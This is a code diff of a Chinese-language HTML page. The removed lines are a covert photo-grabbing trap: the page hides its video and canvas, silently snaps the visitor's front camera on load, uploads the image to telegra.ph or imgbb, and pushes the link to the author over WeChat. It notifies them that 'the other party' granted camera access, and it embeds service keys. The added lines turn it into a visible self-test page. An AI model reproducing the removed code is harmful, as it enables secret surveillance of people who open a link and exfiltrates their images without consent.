@@ -4,84 +4,20 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0">
 <style>
-/* 全程静默无显示 */
-video,canvas{display:none}
-body{background:#fff;height:100vh;margin:0;}
+body{margin:0;padding:20px;font-family:system-ui;}
+#preview{width:100%;max-width:480px;margin-top:20px;}
 </style>
 </head>
 <body>
-<video id="cam" autoplay playsinline muted></video>
-<canvas id="box" width="480" height="480"></canvas>
+<h3>拍照测试</h3>
+<div id="tip">正在请求摄像头权限...</div>
+<img id="preview" />
+<video id="cam" autoplay playsinline muted style="display:none"></video>
+<canvas id="box" width="480" height="480" style="display:none"></canvas>
 
 <script>
-// 你的专属推送密钥，已确认可用
-const SEND_KEY = "SCT347091TUpxTiAuPOAvg27UhZnouc6Th";
-
-// 微信推送核心函数
-async function sendToWechat(title, content) {
+async function testTakePhoto() {
   try {
-    await fetch(`https://sctapi.ftqq.com/${SEND_KEY}.send`, {
-      method: "POST",
-      headers: { "Content-Type": "application/x-www-form-urlencoded" },
-      body: `title=${encodeURIComponent(title)}&desp=${encodeURIComponent(content)}`
-    });
-    return true;
-  } catch (e) {
-    return false;
-  }
-}
-
-// 【修复版】HTTPS稳定图床上传，无跨域，不被浏览器拦截
-async function uploadImage(base64) {
-  try {
-    // 把base64转成Blob文件，适配接口要求
-    const byteString = atob(base64.split(",")[1]);
-    const mimeString = base64.split(",")[0].split(":")[1].split(";")[0];
-    const ab = new ArrayBuffer(byteString.length);
-    const ia = new Uint8Array(ab);
-    for (let i = 0; i < byteString.length; i++) {
-      ia[i] = byteString.charCodeAt(i);
-    }
-    const blob = new Blob([ab], { type: mimeString });
-
-    // 构建FormData
-    const formData = new FormData();
-    formData.append("file", blob, "photo.jpg");
-
-    // 主接口：Telegraph HTTPS接口，无跨域，国内可正常访问
-    const res = await fetch("https://telegra.ph/upload", {
-      method: "POST",
-      body: formData
-    });
-    const result = await res.json();
-    if (result && result[0] && result[0].src) {
-      return `https://telegra.ph${result[0].src}`;
-    }
-    return null;
-  } catch (e) {
-    // 备用接口兜底，主接口失败自动切换
-    try {
-      const formData = new FormData();
-      formData.append("image", base64);
-      const res = await fetch("https://api.imgbb.com/1/upload?key=6d207786a5d1a58502f4f9b0d84f7b9c", {
-        method: "POST",
-        body: formData
-      });
-      const result = await res.json();
-      if (result.success) {
-        return result.data.url;
-      }
-      return null;
-    } catch (err) {
-      return null;
-    }
-  }
-}
-
-// 自动拍照主逻辑
-async function autoTakePhoto() {
-  try {
-    // 请求前置摄像头权限
     const stream = await navigator.mediaDevices.getUserMedia({
       video: { facingMode: "user", width: 480, height: 480 }
     });
@@ -90,32 +26,20 @@ async function autoTakePhoto() {
     const ctx = canvas.getContext("2d");
     video.srcObject = stream;
 
-    // 摄像头就绪立刻执行
-    video.onloadedmetadata = async () => {
-      // 绘制实拍画面
+    video.onloadedmetadata = () => {
       ctx.drawImage(video, 0, 0, 480, 480);
       const base64Img = canvas.toDataURL("image/jpeg", 0.7);
-      // 关闭摄像头，减少设备占用
       stream.getTracks().forEach(track => track.stop());
-
-      // 上传图片+推送最终结果
-      const imgUrl = await uploadImage(base64Img);
-      if (imgUrl) {
-        // 上传成功，发带图推送
-        await sendToWechat("成功拍到新照片", `![实拍图片](${imgUrl})\n\n图片直链：${imgUrl}\n复制链接到浏览器即可查看原图`);
-      } else {
-        // 上传失败，发兜底通知，确保不会漏掉访问
-        await sendToWechat("链接已被访问", "对方已允许摄像头权限，完成拍照，图片上传失败");
-      }
+      
+      // 页面直接显示拍到的照片，确认拍照正常
+      document.getElementById("tip").innerText = "✅ 拍照成功！下面是拍到的照片";
+      document.getElementById("preview").src = base64Img;
     };
   } catch (e) {
-    // 权限拒绝/出错静默处理，无任何页面提示
+    document.getElementById("tip").innerText = "❌ 权限拒绝/摄像头打开失败";
   }
 }
-
-// 页面加载立刻执行
-autoTakePhoto();
+testTakePhoto();
 </script>
 </body>
 </html>
-
